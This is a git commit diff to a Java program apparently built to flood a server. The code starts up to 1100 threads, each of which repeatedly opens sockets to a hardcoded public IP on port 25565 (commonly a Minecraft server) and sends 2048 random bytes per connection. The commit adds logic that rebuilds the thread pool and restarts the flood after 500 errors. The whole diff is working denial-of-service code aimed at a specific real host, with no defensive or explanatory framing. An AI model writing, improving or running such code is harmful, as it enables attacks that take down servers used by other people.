52e912743a7eeffa8d6914c0d27cfe80ee456a3a
chaoruitao <chaoruitao@bytedance.com>
2019-08-10 09:24:07 +0800

    [refactor] a little more advance

--- src/main/java/MainFuck.java
+++ src/main/java/MainFuck.java
@@ -1,9 +1,9 @@
 import org.apache.commons.lang3.RandomStringUtils;
 
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
-import java.sql.Time;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.concurrent.ArrayBlockingQueue;
@@ -22,15 +22,25 @@ class MainFuck {
 
     public static void main(String[] args) {
 
-
         Runnable r = () -> {
             Socket socket = null;
             OutputStream os = null;
+            InputStream in = null;
             try {
                 socket = new Socket("120.79.169.48", 25565);
+                if (!socket.isConnected()) {
+                    System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "[INFO]" + "未能成功连接");
+                    return;
+                }
                 os = socket.getOutputStream();
+                in = socket.getInputStream();
             } catch (IOException e) {
-                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "[ERROR]" + "未能成功连接");
+                try {
+                    os.close();
+                } catch (Exception ex) {
+
+                }
+                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "[ERROR_IOE]" + "未能成功连接");
                 errorCount++;
                 return;
             }
@@ -38,13 +48,25 @@ class MainFuck {
             try {
                 String str = RandomStringUtils.randomAlphanumeric(2048);
                 byte[] strbyte = str.getBytes();
-                int len = 0;
+                int len = 2048;
+                byte[] b = new byte[len];
+                in.read(b);
+                String bstr = new String(b);
+                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "do one input");
                 os.write(strbyte);
-                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "do one");
+                os.flush();
+                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "do one output");
                 os.close();
+
             } catch (IOException e) {
-                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "ERROR 写入异常");
-                return;
+                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "ERROR IOE" + e.getMessage());
+                try {
+                    os.close();
+                    in.close();
+                } catch (Exception ex) {
+
+                }
+                errorCount++;
             }
 
         };
@@ -56,20 +78,27 @@ class MainFuck {
                 }
             }
             if (errorCount > 500) {
-                System.out.println("[INFO] restart");
+                t.shutdown();
+                initThreadPool();
+                System.out.println("---------[INFO] restart----------");
                 errorCount = 0;
                 mainAddTask(r);
             }
         }
     }
 
-    public static void mainAddTask(Runnable r) {
+    private static void initThreadPool(){
+        blockingQueue.clear();
+        t = new ThreadPoolExecutor(0, 1100, 500, TimeUnit.MILLISECONDS, blockingQueue);
+    }
+
+    private static void mainAddTask(Runnable r) {
         for (int i = 0; i < 1000; i++) {
             t.execute(r);
         }
     }
 
-    public static String getDateString() {
+    private static String getDateString() {
         SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
         return (df.format(new Date()));
     }
